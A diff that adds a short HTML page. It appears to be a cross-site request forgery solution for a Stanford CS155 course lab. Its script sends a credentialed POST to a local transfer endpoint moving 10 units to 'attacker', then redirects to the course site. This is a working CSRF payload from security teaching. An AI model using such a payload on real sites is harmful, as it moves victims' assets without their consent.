@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <script>
+      var request = new XMLHttpRequest();
+      request.open("POST", "http://localhost:3000/post_transfer", false);
+      request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+      request.withCredentials = true;
+      try {
+        request.send("quantity=10&destination_username=attacker");
+      } catch (err) {
+        // Do nothing on inevitable XSS error
+      } finally {
+        window.location = "http://crypto.stanford.edu/cs155/";
+      }
+    </script>
+  </body>
+</html>
